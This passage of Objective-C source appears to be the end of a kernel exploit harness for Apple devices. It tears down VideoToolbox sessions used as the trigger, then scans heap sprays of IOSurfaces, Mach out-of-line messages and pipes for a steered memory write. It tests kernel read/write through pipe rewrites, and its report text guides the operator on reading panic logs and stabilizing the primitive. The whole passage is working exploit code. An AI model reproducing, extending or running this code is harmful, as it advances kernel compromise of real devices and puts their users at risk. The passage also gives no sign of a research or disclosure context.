                if (e1 == noErr) {
                    SpriteDrain(victim, vSink, 1, 500);
                }
                @synchronized (vSink) { cb1 = vSink.firstObject ?: @"(no cb)"; }
            }
            [report appendFormat:@"first-encode trigger (NTL=%d) -> enc0=%d(%@) rps=%d postLatch=%d/%d(POST_ENC=%d) enc1=%d(%@)\n",
             vntl, (int)e0, cb0, (int)stRps, (int)stPostUsage, (int)stPostPub, postEncNtl, (int)e1, cb1];
        }
        VTCompressionSessionInvalidate(victim);
        CFRelease(victim);
        CFRelease(retainedVSink);
        if (uVictim) {
            VTCompressionSessionInvalidate(uVictim);
            CFRelease(uVictim);
        }
        [self journal:[NSString stringWithFormat:@"AFTER_VICTIM_TEARDOWN survived ntl=%d x0=0x%016llx", vntl, vx0]];
    }
    if (pb) { CVPixelBufferRelease(pb); pb = NULL; }
    [self journal:@"ALL_VICTIMS_TEARDOWN_DONE — scanning spray for stp [x0,x0,x0,0]"];

    // Scan the fixed-page spray for the stp x0,x0,[x0] signature: the written
    // qwords equal x0 (steeredX0 / candidate) or the marker pair.
    if (surfArray) {
        long hits = 0;
        CFIndex scount = CFArrayGetCount(surfArray);
        for (CFIndex si = 0; si < scount; si++) {
            void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
            uint32_t seed = 0;
            if (sIsLock(surf, 0, &seed) != 0) continue;
            uint8_t *base = (uint8_t *)sIsGetBase(surf);
            size_t sz = sIsGetSize(surf);
            if (base && sz >= 0x4000) {
                for (size_t off = 0; off + 32 <= sz; off += 8) {
                    if (IsExpectedZeroOffset(off)) continue;
                    size_t pageBase = off & ~(size_t)0xfffULL;
                    size_t pageOff = off & 0xfffULL;
                    uint64_t expected = (pageOff < 768) ? markerPair : 0ULL;
                    uint64_t q = *(uint64_t *)(base + off);
                    if (q == expected) continue;
                    int match = (pageOff < 768) ? 200 : 201;
                    uint64_t u59 = 0;
                    if (pageBase + 0x59 + sizeof(uint64_t) <= sz) {
                        memcpy(&u59, base + pageBase + 0x59, sizeof(uint64_t));
                    }
                    for (int c = 0; c < ncand; c++) {
                        if (q == x0cands[c] || u59 == x0cands[c]) { match = c; break; }
                    }
                    if (match >= 200 && ((uint32_t)q == 0x59u || (uint32_t)u59 == 0x59u || (uint32_t)q == 0x100u || (uint32_t)q == 0x259u)) match = 59;
                    uint64_t q2 = *(uint64_t *)(base + off + 8);
                    uint32_t z = *(uint32_t *)(base + off + 0x18);
                    [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx u59=0x%llx z=0x%x match=%d\n",
                     (long)si, off, q, q2, u59, z, match];
                    hits++;
                    if (hits >= 8) break;
                }
            }
            sIsUnlock(surf, 0, &seed);
            if (hits >= 8) break;
        }
        [report appendFormat:@"fixed-page scan: %ld hit(s) in %ld surfaces\n", hits, (long)scount];
        CFRelease(surfArray);
    } else {
        [report appendString:@"fixed-page scan: skipped (IOSurface dlsym unavailable)\n"];
    }

    // Read back OOL queues and pipes: a landed stp write shows as the signature
    // [x0, x0, x0, 0] embedded in the marker-tiled content (or any non-marker mutation).
    int oolHits = 0, pipeHits = 0, sigHits = 0;
    const size_t kSigProbeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
    for (int p = 0; p < oolPortCount; p++) {
        for (int m = 0; m < 8; m++) {
            size_t rtotal = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t) + 256;
            uint8_t *rcv = calloc(1, rtotal);
            if (!rcv) break;
            mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
            rh->msgh_size = (mach_msg_size_t)rtotal;
            kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                         (mach_msg_size_t)rtotal, oolPorts[p], 10, MACH_PORT_NULL);
            if (rkr == KERN_SUCCESS) {
                mach_msg_ool_descriptor_t *od =
                    (mach_msg_ool_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                if (od->address && od->size >= 32) {
                    uint64_t *oq = (uint64_t *)od->address;
                    size_t nq = od->size / 8;
                    for (size_t i3 = 0; i3 + 4 < nq && oolHits < 8; i3++) {
                        size_t ooff = i3 * 8;
                        if (oq[i3] != markerPair && !IsExpectedZeroOffset(ooff)) {
                            [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                             p, m, i3 * 8, oq[i3], oq[i3 + 1], oq[i3 + 2], oq[i3 + 3]];
                            oolHits++;
                            i3 += 3;
                        }
                    }
                    uint8_t *ob = (uint8_t *)od->address;
                    for (size_t pg = 0; pg + 0x280 <= od->size && sigHits < 8; pg += 4096) {
                        for (int oi = 0; oi < 4; oi++) {
                            size_t off = pg + kSigProbeOffs[oi];
                            uint64_t s1 = 0, s2 = 0, s3 = 0;
                            uint32_t z = 0;
                            memcpy(&s1, ob + off, 8);
                            memcpy(&s2, ob + off + 8, 8);
                            memcpy(&s3, ob + off + 16, 8);
                            memcpy(&z,  ob + off + 24, 4);
                            if (s1 != markerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
                                int match = -1;
                                if (s1 == steeredX0) match = -2;
                                for (int c = 0; c < ncand; c++) {
                                    if (s1 == x0cands[c]) { match = c; break; }
                                }
                                [report appendFormat:@"    OOL SIG p=%d m=%d page=0x%zx+0x%zx s1=0x%llx match=%d\n",
                                 p, m, pg, kSigProbeOffs[oi], s1, match];
                                sigHits++;
                            }
                        }
                    }
                }
                if (od->address) {
                    vm_deallocate(mach_task_self(), (vm_address_t)od->address,
                                  (od->size + 4095) & ~(size_t)4095);
                }
            }
            free(rcv);
            if (oolHits >= 8) break;
        }
        if (oolHits >= 8) break;
    }
    for (int p = 0; p < 64; p++) {
        if (pipeFds[p][0] < 0) continue;
        uint8_t *pbuf = (uint8_t *)malloc(512 * 1024);
        if (pbuf) {
            ssize_t got = read(pipeFds[p][0], pbuf, 512 * 1024);
            if (got >= 32) {
                uint64_t *pq = (uint64_t *)pbuf;
                size_t nq = (size_t)got / 8;
                for (size_t i3 = 0; i3 + 4 < nq && pipeHits < 8; i3++) {
                    size_t poff = i3 * 8;
                    if (pq[i3] != markerPair && !IsExpectedZeroOffset(poff)) {
                        [report appendFormat:@"    PIPE HIT p=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                         p, i3 * 8, pq[i3], pq[i3 + 1], pq[i3 + 2], pq[i3 + 3]];
                        pipeHits++;
                        i3 += 3;
                    }
                }
                for (size_t pg = 0; pg + 0x280 <= (size_t)got && sigHits < 8; pg += 4096) {
                    for (int oi = 0; oi < 4; oi++) {
                        size_t off = pg + kSigProbeOffs[oi];
                        uint64_t s1 = 0, s2 = 0, s3 = 0;
                        uint32_t z = 0;
                        memcpy(&s1, pbuf + off, 8);
                        memcpy(&s2, pbuf + off + 8, 8);
                        memcpy(&s3, pbuf + off + 16, 8);
                        memcpy(&z,  pbuf + off + 24, 4);
                        if (s1 != markerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
                            int match = -1;
                            if (s1 == steeredX0) match = -2;
                            for (int c = 0; c < ncand; c++) {
                                if (s1 == x0cands[c]) { match = c; break; }
                            }
                            uint64_t krwProbe = s1 ^ 0x00000000cafebabeULL;
                            memcpy(pbuf + off, &krwProbe, 8);
                            ssize_t wr = write(pipeFds[p][1], pbuf + pg, 4096);
                            uint64_t krwReadback = 0;
                            if (wr >= 4096) {
                                uint8_t rdb[4096];
                                if (read(pipeFds[p][0], rdb, 4096) >= (ssize_t)(kSigProbeOffs[oi] + 8)) {
                                    memcpy(&krwReadback, rdb + kSigProbeOffs[oi], 8);
                                }
                            }
                            [report appendFormat:@"    PIPE SIG p=%d page=0x%zx+0x%zx s1=0x%llx match=%d rwVerify=0x%016llx\n",
                             p, pg, kSigProbeOffs[oi], s1, match, krwReadback];
                            sigHits++;
                        }
                    }
                }
            }
            free(pbuf);
        }
        close(pipeFds[p][0]);
        close(pipeFds[p][1]);
    }
    [report appendFormat:@"kernel-object scan: ool_hits=%d pipe_hits=%d sig_hits=%d\n", oolHits, pipeHits, sigHits];
    for (int p = 0; p < oolPortCount; p++) {
        if (oolPorts[p] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), oolPorts[p]);
    }
    if (tile) free(tile);

    for (NSValue *v in siblings) {
        VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
        CFRelease((VTCompressionSessionRef)v.pointerValue);
    }
    if (pb) CVPixelBufferRelease(pb);

    [report appendFormat:@"\nsessions_created=%d\n", (int)siblings.count];
    [report appendString:@"\nVERDICT: "];
    [report appendString:@"SEE_JOURNAL_AND_PANIC_FAR\n"];
    [report appendString:
     @"If the device panicked: pull panic-full and read far/x0.\n"
     @"  far=0x59 -> spray did not shape the OOB read; try a different object\n"
     @"             class (kalloc size matching the pInfo zone) or more volume.\n"
     @"  far != 0x59 -> OUR data was consumed. Compare against the marker to\n"
     @"             locate the exact field and lock the primitive.\n"
     @"Survived: check OOL/PIPE/SURFACE HIT lines — a [x0,x0,x0,0] signature is\n"
     @"  the steered write landing in our kernel objects (kread/kwrite seed).\n"];
    return report;
}

@end
